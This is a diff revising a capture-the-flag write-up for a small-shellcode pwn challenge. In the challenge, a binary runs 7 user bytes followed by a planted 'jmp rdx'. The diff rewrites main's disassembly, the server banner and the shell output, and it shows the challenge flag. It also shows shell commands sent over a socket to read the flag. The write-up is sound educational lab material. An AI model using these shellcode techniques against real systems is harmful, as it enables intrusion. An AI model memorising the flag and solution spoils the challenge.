@@ -38,12 +38,14 @@ ba 84 12 40 00       mov edx, 0x401284
    --- the program now plants `ff e2` -> jmp rdx ---
 ```
 
-`jmp rdx` lands at `0x401284`, the chain runs, the shell pops. Then
-`cat flag.txt` finishes:
+`jmp rdx` lands at `0x401284`, the chain runs, the shell pops over the
+existing socket. The server's only banner string is `Another mission
+right boss?`; once the shell is live, `id; cat flag* 2>&1; exit` prints
+the flag:
 
 ```
-[The Darth Vader]: Not bad! Now I'll show you the power of the dark side!
-End him now!
+Another mission right boss?
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
 HASBL{C4N_Y0U_FLY?_N0_JUMP_G00D}
 ```
 
@@ -51,39 +53,59 @@ HASBL{C4N_Y0U_FLY?_N0_JUMP_G00D}
 
 ### Step 1 — what's in `main`?
 
+`main` starts at `0x401176` (binary is stripped so there is no
+symbol — Ghidra/objdump just labels it by address). The body in
+order:
+
 ```nasm
+0x401176 <main>:
+  401176: push   rbp
+  401177: mov    rbp, rsp
+  40117a: sub    rsp, 0x10
+
 ; mmap(NULL, 9, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
-1400119a: r9d = 0                ; offset
-14001184: r8d = -1               ; fd
-14001189: ecx = 0x22             ; MAP_PRIVATE | MAP_ANONYMOUS
-14001178: edx = 0x07             ; PROT_READ | PROT_WRITE | PROT_EXEC
-14001194: esi = 9                ; length
-14001199: edi = 0                ; addr (NULL)
-1400119e: call mmap@plt
+  40117e: mov    r9d, 0           ; offset
+  401184: mov    r8d, -1          ; fd
+  40118a: mov    ecx, 0x22        ; MAP_PRIVATE | MAP_ANONYMOUS
+  40118f: mov    edx, 7           ; PROT_READ | PROT_WRITE | PROT_EXEC
+  401194: mov    esi, 9           ; length
+  401199: mov    edi, 0           ; addr (NULL)
+  40119e: call   mmap@plt
+  4011a3: mov    [rbp-0x8], rax   ; page = rax
+  ; …MAP_FAILED check elided (jumps to a `perror("mmap failed")`)…
+
+; puts("Another mission right boss?")
+  4011c4: lea    rax, [rip+0xe45] ; -> 0x402010 "Another mission right boss?"
+  4011cb: mov    rdi, rax
+  4011ce: call   puts@plt
 
 ; memset(page, 0, 9)
-14001186: edx = 9
-14001188: esi = 0
-14001190: rdi = page
-140011b6: call memset@plt
+  4011d3: mov    rax, [rbp-0x8]
+  4011d7: mov    edx, 9
+  4011dc: mov    esi, 0
+  4011e1: mov    rdi, rax
+  4011e4: call   memset@plt
 
 ; read(0, page, 7)
-140011d7: edx = 7                ; <-- the magic 7
-140011dc: esi = 0
-140011e1: rdi = page
-140011fa: call read@plt
+  4011e9: mov    rax, [rbp-0x8]
+  4011ed: mov    edx, 7           ; <-- the magic 7
+  4011f2: mov    rsi, rax
+  4011f5: mov    edi, 0
+  4011fa: call   read@plt
 
 ; page[7] = 0xff
-140011ff: rax = page
-14001203: rax += 7
-14001207: byte ptr [rax] = 0xff   ; <-- patching `jmp rdx` byte 0
+  4011ff: mov    rax, [rbp-0x8]
+  401203: add    rax, 7
+  401207: mov    byte ptr [rax], 0xff  ; <-- planting `jmp rdx` byte 0
 
 ; page[8] = 0xe2
-14001212: byte ptr [rax+1] = 0xe2 ; <-- patching `jmp rdx` byte 1
+  40120a: mov    rax, [rbp-0x8]
+  40120e: add    rax, 8
+  401212: mov    byte ptr [rax], 0xe2  ; <-- planting `jmp rdx` byte 1
 
 ; ((void(*)())page)()
-14001215: rax = page
-14001219: call rax
+  401215: mov    rax, [rbp-0x8]
+  401219: call   rax
 ```
 
 So the page layout right before the call is:
@@ -243,11 +265,11 @@ s.sendall(b"id; cat flag* 2>&1; exit\n")
 print(s.recv(4096).decode())
 ```
 
-Output:
+Output (server banner, then the shell's reply to `id; cat flag*; exit`):
 
 ```
-[The Darth Vader]: Not bad! Now I'll show you the power of the dark side!
-End him now!
+Another mission right boss?
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
 HASBL{C4N_Y0U_FLY?_N0_JUMP_G00D}
 ```
 
